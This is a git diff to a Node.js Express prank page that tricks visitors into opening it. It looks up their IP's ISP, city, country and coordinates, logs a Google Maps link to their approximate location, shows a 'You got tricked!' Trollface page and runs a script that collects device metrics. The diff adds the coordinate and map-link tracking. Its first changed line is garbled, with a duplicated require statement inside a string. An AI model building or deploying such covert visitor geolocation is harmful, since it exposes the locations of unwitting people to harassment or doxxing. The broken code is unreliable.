@@ -1,4 +1,4 @@
-const express = require('express');
+const express = require('expressconst express = require('express');
 const app = express();
 
 app.set('trust proxy', true);
@@ -39,13 +39,15 @@ app.post('/api/log', (req, res) => {
   res.sendStatus(200);
 });
 
-// 2. Main Route: Renders landing page and fetches ISP data
+// 2. Main Route: Renders landing page and fetches location/ISP data
 app.get('/', async (req, res) => {
   const visitorIp = req.ip || req.headers['x-forwarded-for'] || 'Unknown IP';
   
   let ispName = 'Unknown ISP';
   let countryName = 'Unknown Location';
   let cityName = 'Unknown City';
+  let lat = null;
+  let lon = null;
 
   // Fetch location & network metadata from IP API
   try {
@@ -56,13 +58,18 @@ app.get('/', async (req, res) => {
       ispName = geoData.isp || geoData.org || 'Unknown ISP';
       countryName = geoData.country || 'Unknown Location';
       cityName = geoData.city || 'Unknown City';
+      lat = geoData.lat;
+      lon = geoData.lon;
     }
   } catch (error) {
     console.log('Error fetching IP data:', error.message);
   }
 
-  // Log server-side access immediately
-  console.log(`[VISITOR ALERT] IP: ${visitorIp} | Location: ${cityName}, ${countryName} | ISP: ${ispName}`);
+  // Print general location and map link in Railway console
+  console.log(`[VISITOR ALERT] IP: ${visitorIp} | Location: ${cityName}, ${countryName} (${lat}, ${lon}) | ISP: ${ispName}`);
+  if (lat && lon) {
+    console.log(`[APPROX MAP] https://www.google.com/maps?q=${lat},${lon}`);
+  }
 
   // Send HTML page with embedded script for client-side device checks
   res.send(`
@@ -110,7 +117,7 @@ app.get('/', async (req, res) => {
     <body>
       <img src="https://i.kym-cdn.com/entries/icons/original/000/000/091/Trollface.png" alt="Trollface">
       <h1>You got tricked!</h1>
-      <p>Greetings to someone connecting via <strong>${ispName}</strong> in <strong>${countryName}</strong>.</p>
+      <p>Greetings to someone connecting via <strong>${ispName}</strong> in <strong>${cityName}, ${countryName}</strong>.</p>
 
       <script>
         async function collectDeviceMetrics() {
@@ -158,4 +165,3 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
 
 // trigger build
-         
